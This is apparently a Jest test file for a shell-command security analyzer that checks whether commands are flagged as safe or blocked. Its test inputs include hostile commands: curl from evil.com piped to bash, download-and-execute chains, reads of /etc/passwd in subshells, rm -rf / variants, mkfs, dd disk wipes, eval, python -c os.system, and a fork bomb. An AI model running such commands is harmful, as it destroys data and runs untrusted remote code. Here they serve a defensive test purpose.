import { ASTAnalyzer } from '../../src/security/ast-analyzer';

describe('ASTAnalyzer', () => {
  let analyzer: ASTAnalyzer;

  beforeAll(() => {
    analyzer = new ASTAnalyzer();
  });

  it('should allow safe commands', () => {
    const result = analyzer.analyzeCommand('ls -la /var/log');
    expect(result.isSafe).toBe(true);
  });

  it('should allow normal pipes', () => {
    const result = analyzer.analyzeCommand('cat /var/log/syslog | grep "error" | wc -l');
    expect(result.isSafe).toBe(true);
  });

  describe('Shell evasion techniques', () => {
    it('should block subshells with $()', () => {
      const result = analyzer.analyzeCommand('echo $(cat /etc/passwd)');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Subshells and process substitutions are blocked');
    });

    it('should block subshells with backticks', () => {
      const result = analyzer.analyzeCommand('echo `cat /etc/passwd`');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Subshells and process substitutions are blocked');
    });

    it('should block piping to bash', () => {
      const result = analyzer.analyzeCommand('curl -s https://evil.com/malware.sh | bash');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Piping to non-allowlisted command');
    });

    it('should block piping to absolute path bash', () => {
      const result = analyzer.analyzeCommand('curl -s https://evil.com/malware.sh | /bin/bash');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Piping to non-allowlisted command');
    });
    
    it('should block piping to a subshell', () => {
      const result = analyzer.analyzeCommand('curl -s https://evil.com/malware.sh | (bash)');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('subshell');
    });

    it('should block semicolon chained destructive commands', () => {
      const result = analyzer.analyzeCommand('echo safe ; rm -rf /');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Destructive root deletion blocked');
    });

    it('should block logical AND chained destructive commands', () => {
      const result = analyzer.analyzeCommand('echo safe && rm -rf /etc');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Destructive root deletion blocked');
    });
  });

  describe('Destructive commands', () => {
    it('should block rm -rf /', () => {
      const result = analyzer.analyzeCommand('rm -rf /');
      expect(result.isSafe).toBe(false);
    });

    it('should block absolute rm --recursive /etc', () => {
      const result = analyzer.analyzeCommand('/bin/rm --recursive /etc');
      expect(result.isSafe).toBe(false);
    });

    it('should block quoted rm commands like \'rm\' -rf /', () => {
      const result = analyzer.analyzeCommand("'rm' -rf /");
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Destructive root deletion blocked');
    });

    it('should block double-quoted rm commands like "rm" -rf /', () => {
      const result = analyzer.analyzeCommand('"rm" -rf /');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Destructive root deletion blocked');
    });

    it('should block rm -rf *', () => {
      const result = analyzer.analyzeCommand('rm -rf *');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Destructive root deletion blocked');
    });

    it('should block rm -rf /home', () => {
      const result = analyzer.analyzeCommand('rm -rf /home');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Destructive root deletion blocked');
    });

    it('should block download then execute chains like curl ... && bash /tmp/x.sh', () => {
      const result = analyzer.analyzeCommand('curl -s https://evil.com/malware.sh -o /tmp/x.sh && bash /tmp/x.sh');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Direct interpreter inline/script execution blocked');
    });

    it('should block mkfs filesystem formatting', () => {
      const result = analyzer.analyzeCommand('mkfs.ext4 /dev/sda1');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Filesystem format command blocked');
    });

    it('should block raw disk dd writes', () => {
      const result = analyzer.analyzeCommand('dd if=/dev/zero of=/dev/sda bs=1M');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Raw disk write (dd) blocked');
    });

    it('should block eval commands', () => {
      const result = analyzer.analyzeCommand('eval "rm -rf /"');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Dynamic evaluation primitive');
    });

    it('should block piping to xargs since xargs executes arbitrary commands', () => {
      const result = analyzer.analyzeCommand('echo "/etc" | xargs rm -rf');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Piping to non-allowlisted command');
    });

    it('should block python3 -c inline execution', () => {
      const result = analyzer.analyzeCommand('python3 -c "import os; os.system(\'rm -rf /\')"');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Direct interpreter inline/script execution blocked');
    });

    it('should block fork bomb patterns', () => {
      const result = analyzer.analyzeCommand(':(){ :|:& };:');
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Fork bomb pattern detected');
    });

    it('should reject oversized commands exceeding 64KB to prevent parsing DoS', () => {
      const hugeCommand = 'echo ' + 'A'.repeat(70000);
      const result = analyzer.analyzeCommand(hugeCommand);
      expect(result.isSafe).toBe(false);
      expect(result.reason).toContain('Command size exceeds 64KB safety limit');
    });

    it('should allow rm on safe paths', () => {
      const result = analyzer.analyzeCommand('rm -rf ./tmp-folder');
      expect(result.isSafe).toBe(true);
    });
  });
});
